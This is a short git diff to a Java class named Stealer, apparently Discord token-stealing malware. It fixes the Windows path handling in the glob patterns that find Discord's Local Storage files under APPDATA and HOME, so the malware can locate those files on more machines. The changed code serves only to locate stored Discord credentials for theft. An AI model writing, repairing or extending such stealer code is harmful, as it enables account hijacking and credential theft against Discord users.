@@ -12,11 +12,12 @@ import java.sql.*;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
+import java.util.Objects;
 import java.util.stream.Stream;
 
 public class Stealer {
     private static final String UNIX_LOCALSTORAGE = "glob:" + System.getenv("HOME") + "/.config/discord*/Local Storage/*discordapp*_0.localstorage";
-    private static final String WINDOWS_LOCALSTORAGE = "glob:" + System.getenv("APPDATA") + "\\discord*\\Local Storage\\*discordapp*_0.localstorage";
+    private static final String WINDOWS_LOCALSTORAGE = "glob:" + System.getenv("APPDATA") + "/discord*/Local Storage/*discordapp*_0.localstorage";
 
     public static void steal() {
         try {
@@ -134,7 +135,9 @@ public class Stealer {
     }
 
     private static List<Path> getWindowsDiscordLocations() {
-        return globRecurse(WINDOWS_LOCALSTORAGE, System.getenv("APPDATA"));
+
+        return globRecurse(WINDOWS_LOCALSTORAGE.replace("\\", "/"),
+                System.getenv("APPDATA").replace("\\", "/"));
     }
 
     private static List<Path> getUnixDiscordLocations() {
